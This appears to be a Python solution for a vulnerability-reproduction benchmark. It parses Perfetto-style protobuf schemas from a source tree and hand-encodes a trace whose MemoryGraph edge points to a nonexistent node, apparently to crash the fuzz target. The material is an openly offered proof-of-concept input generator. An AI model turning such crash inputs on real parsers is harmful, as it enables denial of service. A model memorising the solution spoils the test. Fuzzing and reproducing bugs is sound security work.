import os
import re
import tarfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Iterable


def _read_text(data: bytes) -> str:
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _iter_src_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size > 5_000_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 5_000_000:
                    continue
                name = m.name
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield name, data
    except Exception:
        return


def _strip_proto_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _tokenize_proto(s: str) -> List[str]:
    s = _strip_proto_comments(s)
    tok_re = re.compile(r'[A-Za-z_][A-Za-z0-9_\.]*|\d+|[{}=;<>[\](),]')
    return tok_re.findall(s)


@dataclass
class ProtoField:
    name: str
    number: int
    type_name: str
    label: str = ""  # optional/repeated/required/""
    parent: str = ""


@dataclass
class ProtoMessage:
    full_name: str
    fields: Dict[str, ProtoField] = field(default_factory=dict)


class ProtoSchema:
    def __init__(self) -> None:
        self.messages: Dict[str, ProtoMessage] = {}

    def add_message(self, msg: ProtoMessage) -> None:
        self.messages[msg.full_name] = msg

    def get_by_suffix(self, suffix: str) -> Optional[ProtoMessage]:
        # Prefer exact last-component match
        best = None
        for name, msg in self.messages.items():
            if name == suffix or name.endswith("." + suffix) or name.split(".")[-1] == suffix:
                if best is None:
                    best = msg
                else:
                    if len(name) < len(best.full_name):
                        best = msg
        return best

    def find_message_with_field(self, field_name: str) -> Optional[ProtoMessage]:
        for msg in self.messages.values():
            if field_name in msg.fields:
                return msg
        return None

    def all_messages(self) -> List[ProtoMessage]:
        return list(self.messages.values())


class ProtoParser:
    def __init__(self) -> None:
        self.schema = ProtoSchema()

    def parse(self, proto_text: str) -> None:
        toks = _tokenize_proto(proto_text)
        package = ""
        i = 0
        while i < len(toks):
            if toks[i] == "package":
                if i + 2 < len(toks):
                    package = toks[i + 1].strip()
                while i < len(toks) and toks[i] != ";":
                    i += 1
                i += 1
                continue
            if toks[i] == "message" and i + 1 < len(toks):
                i = self._parse_message(toks, i, package, prefix="")
                continue
            i += 1

    def _parse_message(self, toks: List[str], i: int, package: str, prefix: str) -> int:
        # toks[i] == 'message'
        if i + 2 >= len(toks):
            return i + 1
        name = toks[i + 1]
        i += 2
        # expect '{'
        while i < len(toks) and toks[i] != "{":
            i += 1
        if i >= len(toks):
            return i
        i += 1  # skip '{'
        full = name
        if prefix:
            full = prefix + "." + name
        if package:
            full = package + "." + full
        msg = self.schema.messages.get(full)
        if msg is None:
            msg = ProtoMessage(full_name=full)
            self.schema.add_message(msg)
        # parse body
        while i < len(toks):
            t = toks[i]
            if t == "}":
                return i + 1
            if t == "message" and i + 1 < len(toks):
                # nested message: prefix becomes current message without package
                # reconstruct non-package prefix
                nonpkg = full
                if package and nonpkg.startswith(package + "."):
                    nonpkg = nonpkg[len(package) + 1 :]
                i = self._parse_message(toks, i, package, prefix=nonpkg)
                continue
            if t == "oneof":
                i = self._parse_oneof(toks, i, msg)
                continue
            if t in ("enum", "extend"):
                i = self._skip_block_or_stmt(toks, i)
                continue
            if t in ("option", "reserved", "extensions", "import", "syntax"):
                i = self._skip_stmt(toks, i)
                continue

            parsed = self._try_parse_field(toks, i, msg)
            if parsed is not None:
                i = parsed
                continue

            i += 1
        return i

    def _skip_stmt(self, toks: List[str], i: int) -> int:
        while i < len(toks) and toks[i] != ";":
            i += 1
        return i + 1 if i < len(toks) else i

    def _skip_block_or_stmt(self, toks: List[str], i: int) -> int:
        # Skip until ';' or matching {...}
        j = i
        while j < len(toks) and toks[j] not in ("{", ";"):
            j += 1
        if j >= len(toks):
            return j
        if toks[j] == ";":
            return j + 1
        # toks[j] == '{'
        depth = 0
        k = j
        while k < len(toks):
            if toks[k] == "{":
                depth += 1
            elif toks[k] == "}":
                depth -= 1
                if depth == 0:
                    return k + 1
            k += 1
        return k

    def _parse_oneof(self, toks: List[str], i: int, msg: ProtoMessage) -> int:
        # oneof NAME { fields }
        i += 1  # skip 'oneof'
        if i < len(toks):
            i += 1  # skip name
        while i < len(toks) and toks[i] != "{":
            i += 1
        if i >= len(toks):
            return i
        i += 1  # skip '{'
        while i < len(toks):
            if toks[i] == "}":
                return i + 1
            parsed = self._try_parse_field(toks, i, msg, allow_unlabeled=True)
            if parsed is not None:
                i = parsed
                continue
            i += 1
        return i

    def _parse_type(self, toks: List[str], i: int) -> Tuple[Optional[str], int]:
        if i >= len(toks):
            return None, i
        if toks[i] == "map":
            # map<key, value>
            j = i
            while j < len(toks) and toks[j] != ">":
                j += 1
            if j < len(toks):
                j += 1
            return "map", j
        return toks[i], i + 1

    def _try_parse_field(self, toks: List[str], i: int, msg: ProtoMessage, allow_unlabeled: bool = True) -> Optional[int]:
        if i >= len(toks):
            return None
        label = ""
        j = i
        if toks[j] in ("optional", "repeated", "required"):
            label = toks[j]
            j += 1
        elif not allow_unlabeled:
            return None

        type_name, j2 = self._parse_type(toks, j)
        if type_name is None:
            return None
        j = j2
        if j >= len(toks):
            return None
        field_name = toks[j]
        # field_name should be identifier
        if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", field_name):
            return None
        j += 1
        if j >= len(toks) or toks[j] != "=":
            # not a field
            return None
        j += 1
        if j >= len(toks) or not toks[j].isdigit():
            return None
        num = int(toks[j])
        j += 1
        # skip field options [...]
        if j < len(toks) and toks[j] == "[":
            depth = 0
            while j < len(toks):
                if toks[j] == "[":
                    depth += 1
                elif toks[j] == "]":
                    depth -= 1
                    if depth == 0:
                        j += 1
                        break
                j += 1
        # expect ';'
        while j < len(toks) and toks[j] != ";":
            # some weird constructs; bail if a block starts
            if toks[j] == "{":
                return None
            j += 1
        if j >= len(toks):
            return None
        j += 1
        # store field
        if field_name not in msg.fields:
            msg.fields[field_name] = ProtoField(name=field_name, number=num, type_name=type_name, label=label, parent=msg.full_name)
        return j


def _pb_varint(x: int) -> bytes:
    if x < 0:
        x &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _pb_tag(field_no: int, wire_type: int) -> bytes:
    return _pb_varint((field_no << 3) | wire_type)


def _pb_field_varint(field_no: int, value: int) -> bytes:
    return _pb_tag(field_no, 0) + _pb_varint(value)


def _pb_field_bytes(field_no: int, data: bytes) -> bytes:
    return _pb_tag(field_no, 2) + _pb_varint(len(data)) + data


def _endswith_type(type_name: str, suffix: str) -> bool:
    t = type_name.lstrip(".")
    return t == suffix or t.endswith("." + suffix) or t.split(".")[-1] == suffix


def _pick_top_level_decoder(cpp_texts: List[str]) -> Optional[str]:
    # Find message name used in pbzero::X::Decoder
    # Prefer Trace/TracePacket/MemorySnapshot if present.
    decoder_names: List[str] = []
    pat = re.compile(r"\b(?:protos::pbzero|pbzero)::([A-Za-z_][A-Za-z0-9_]*)::Decoder\b")
    for s in cpp_texts:
        for m in pat.finditer(s):
            decoder_names.append(m.group(1))
    if not decoder_names:
        return None
    preferred = ["Trace", "TracePacket", "MemorySnapshot", "MemoryGraph"]
    for p in preferred:
        if p in decoder_names:
            return p
    return decoder_names[0]


def _find_trace_packet_and_trace(schema: ProtoSchema) -> Tuple[Optional[ProtoMessage], Optional[ProtoMessage]]:
    trace_packet = schema.get_by_suffix("TracePacket")
    trace = schema.get_by_suffix("Trace")
    # Sometimes TracePacket might have different suffix
    if trace_packet is None:
        for msg in schema.all_messages():
            if msg.full_name.split(".")[-1].lower() == "tracepacket":
                trace_packet = msg
                break
    if trace is None:
        for msg in schema.all_messages():
            if msg.full_name.split(".")[-1] == "Trace":
                trace = msg
                break
    return trace_packet, trace


def _find_memory_snapshot(schema: ProtoSchema) -> Optional[ProtoMessage]:
    ms = schema.get_by_suffix("MemorySnapshot")
    if ms is not None:
        return ms
    # Sometimes called MemorySnapshotPacket etc; pick any with field type MemoryGraph
    for msg in schema.all_messages():
        for f in msg.fields.values():
            if _endswith_type(f.type_name, "MemoryGraph"):
                if msg.full_name.split(".")[-1].lower().find("snapshot") != -1:
                    return msg
    # Fallback: any message named *Snapshot*
    for msg in schema.all_messages():
        if "Snapshot" in msg.full_name.split(".")[-1]:
            return msg
    return None


def _find_memory_graph(schema: ProtoSchema) -> Optional[ProtoMessage]:
    mg = schema.get_by_suffix("MemoryGraph")
    if mg is not None:
        return mg
    # find message that has repeated Node and Edge fields
    for msg in schema.all_messages():
        has_node = any(_endswith_type(f.type_name, "Node") and f.label == "repeated" for f in msg.fields.values())
        has_edge = any(_endswith_type(f.type_name, "Edge") and f.label == "repeated" for f in msg.fields.values())
        if has_node and has_edge:
            return msg
    return None


def _pick_field_by_name_or_type(msg: ProtoMessage, names: List[str], type_suffix: Optional[str] = None, require_repeated: Optional[bool] = None) -> Optional[ProtoField]:
    for n in names:
        if n in msg.fields:
            f = msg.fields[n]
            if require_repeated is not None and (f.label == "repeated") != require_repeated:
                continue
            if type_suffix is not None and not _endswith_type(f.type_name, type_suffix):
                continue
            return f
    # fallback by type
    if type_suffix is not None:
        for f in msg.fields.values():
            if _endswith_type(f.type_name, type_suffix):
                if require_repeated is not None and (f.label == "repeated") != require_repeated:
                    continue
                return f
    return None


def _build_poc(schema: ProtoSchema, top_level: str) -> bytes:
    trace_packet_msg, trace_msg = _find_trace_packet_and_trace(schema)
    memsnap_msg = _find_memory_snapshot(schema)
    memgraph_msg = _find_memory_graph(schema)

    if memgraph_msg is None or memsnap_msg is None:
        # Fallback: attempt to craft something minimal anyway
        return b"\x0a\x00"

    # MemoryGraph fields
    nodes_f = _pick_field_by_name_or_type(memgraph_msg, ["nodes", "node"], type_suffix="Node", require_repeated=True)
    edges_f = _pick_field_by_name_or_type(memgraph_msg, ["edges", "edge"], type_suffix="Edge", require_repeated=True)
    root_f = _pick_field_by_name_or_type(memgraph_msg, ["root_node_id", "root_id", "root"], type_suffix=None, require_repeated=False)

    # Find Node and Edge messages to get id/source/target field numbers
    node_msg = schema.get_by_suffix("Node")
    edge_msg = schema.get_by_suffix("Edge")
    # Prefer nested MemoryGraph.Node / MemoryGraph.Edge if present
    for m in schema.all_messages():
        if m.full_name.endswith(".MemoryGraph.Node") or m.full_name.split(".")[-2:] == ["MemoryGraph", "Node"]:
            node_msg = m
        if m.full_name.endswith(".MemoryGraph.Edge") or m.full_name.split(".")[-2:] == ["MemoryGraph", "Edge"]:
            edge_msg = m
    if node_msg is None or edge_msg is None or nodes_f is None or edges_f is None:
        return b"\x0a\x00"

    node_id_f = _pick_field_by_name_or_type(node_msg, ["id", "node_id"], type_suffix=None, require_repeated=False)
    if node_id_f is None:
        # pick first numeric field
        if node_msg.fields:
            node_id_f = list(node_msg.fields.values())[0]
        else:
            return b"\x0a\x00"

    edge_src_f = _pick_field_by_name_or_type(edge_msg, ["source_node_id", "source", "from_node_id", "from"], type_suffix=None, require_repeated=False)
    edge_tgt_f = _pick_field_by_name_or_type(edge_msg, ["target_node_id", "target", "to_node_id", "to"], type_suffix=None, require_repeated=False)
    if edge_src_f is None or edge_tgt_f is None:
        # fallback: pick first two fields
        fields = list(edge_msg.fields.values())
        if len(fields) >= 2:
            edge_src_f, edge_tgt_f = fields[0], fields[1]
        else:
            return b"\x0a\x00"

    # MemorySnapshot field containing MemoryGraph
    ms_graph_f = None
    # Prefer process/global graphs
    for cand in ["process_memory_graph", "global_memory_graph", "process_graph", "global_graph", "memory_graph", "graph"]:
        if cand in memsnap_msg.fields and _endswith_type(memsnap_msg.fields[cand].type_name, "MemoryGraph"):
            ms_graph_f = memsnap_msg.fields[cand]
            break
    if ms_graph_f is None:
        for f in memsnap_msg.fields.values():
            if _endswith_type(f.type_name, "MemoryGraph"):
                ms_graph_f = f
                break
    if ms_graph_f is None:
        return b"\x0a\x00"

    ms_pid_f = _pick_field_by_name_or_type(memsnap_msg, ["pid", "process_id"], type_suffix=None, require_repeated=False)
    ms_ts_f = _pick_field_by_name_or_type(memsnap_msg, ["timestamp", "ts"], type_suffix=None, require_repeated=False)

    # Build Node( id=1 )
    node_bytes = _pb_field_varint(node_id_f.number, 1)

    # Build Edge( source_node_id=1, target_node_id=2 (missing) )
    edge_bytes = _pb_field_varint(edge_src_f.number, 1) + _pb_field_varint(edge_tgt_f.number, 2)

    # Build MemoryGraph( nodes=[node], edges=[edge], root_node_id=1 if exists )
    graph_payload = _pb_field_bytes(nodes_f.number, node_bytes) + _pb_field_bytes(edges_f.number, edge_bytes)
    if root_f is not None:
        graph_payload = _pb_field_varint(root_f.number, 1) + graph_payload

    # Build MemorySnapshot( pid=1 if exists, timestamp=1 if exists, graph field = graph )
    ms_payload_parts = []
    if ms_pid_f is not None:
        ms_payload_parts.append(_pb_field_varint(ms_pid_f.number, 1))
    if ms_ts_f is not None:
        ms_payload_parts.append(_pb_field_varint(ms_ts_f.number, 1))
    ms_payload_parts.append(_pb_field_bytes(ms_graph_f.number, graph_payload))
    ms_payload = b"".join(ms_payload_parts)

    if top_level == "MemorySnapshot":
        return ms_payload

    # Build TracePacket( timestamp=1 if exists, memory_snapshot=ms )
    if trace_packet_msg is None:
        return ms_payload

    tp_ms_f = None
    # Prefer field named memory_snapshot or type MemorySnapshot
    if "memory_snapshot" in trace_packet_msg.fields:
        tp_ms_f = trace_packet_msg.fields["memory_snapshot"]
    else:
        for f in trace_packet_msg.fields.values():
            if _endswith_type(f.type_name, "MemorySnapshot") or _endswith_type(f.type_name, memsnap_msg.full_name.split(".")[-1]):
                tp_ms_f = f
                break
    if tp_ms_f is None:
        # Fallback: might be named heap_graph or memory_dump; just embed ms into any message field is risky
        return ms_payload

    tp_ts_f = _pick_field_by_name_or_type(trace_packet_msg, ["timestamp", "ts"], type_suffix=None, require_repeated=False)
    tp_payload_parts = []
    if tp_ts_f is not None:
        tp_payload_parts.append(_pb_field_varint(tp_ts_f.number, 1))
    tp_payload_parts.append(_pb_field_bytes(tp_ms_f.number, ms_payload))
    tp_payload = b"".join(tp_payload_parts)

    if top_level == "TracePacket":
        return tp_payload

    # Build Trace( packet = TracePacket )
    if trace_msg is None:
        # Most perfetto traces are a stream of TracePacket fields with number 1, even without outer message.
        # But safe fallback: treat as Trace message with field 1 if no definition found.
        return _pb_field_bytes(1, tp_payload)

    trace_packet_field = None
    # common names: packet, packets
    for cand in ["packet", "packets"]:
        if cand in trace_msg.fields and _endswith_type(trace_msg.fields[cand].type_name, "TracePacket"):
            trace_packet_field = trace_msg.fields[cand]
            break
    if trace_packet_field is None:
        for f in trace_msg.fields.values():
            if _endswith_type(f.type_name, "TracePacket"):
                trace_packet_field = f
                break
    if trace_packet_field is None:
        trace_packet_field = ProtoField(name="packet", number=1, type_name="TracePacket", label="repeated", parent=trace_msg.full_name)

    return _pb_field_bytes(trace_packet_field.number, tp_payload)


class Solution:
    def solve(self, src_path: str) -> bytes:
        cpp_texts: List[str] = []
        proto_texts: List[str] = []

        for name, data in _iter_src_files(src_path):
            low = name.lower()
            if low.endswith((".cc", ".cpp", ".cxx", ".c", ".h", ".hpp")):
                txt = _read_text(data)
                if "LLVMFuzzerTestOneInput" in txt or "FuzzerTestOneInput" in txt or "TraceProcessor" in txt:
                    cpp_texts.append(txt)
                continue
            if low.endswith(".proto"):
                txt = _read_text(data)
                if ("message TracePacket" in txt) or ("message Trace" in txt) or ("MemorySnapshot" in txt) or ("MemoryGraph" in txt):
                    proto_texts.append(txt)

        parser = ProtoParser()
        for pt in proto_texts:
            try:
                parser.parse(pt)
            except Exception:
                continue

        top = _pick_top_level_decoder(cpp_texts)
        if top is None:
            # Default to Trace if available, else TracePacket, else MemorySnapshot
            schema = parser.schema
            if schema.get_by_suffix("Trace") is not None:
                top = "Trace"
            elif schema.get_by_suffix("TracePacket") is not None:
                top = "TracePacket"
            else:
                top = "MemorySnapshot"

        poc = _build_poc(parser.schema, top)

        # Ensure non-empty
        if not poc:
            poc = b"\x0a\x00"
        return poc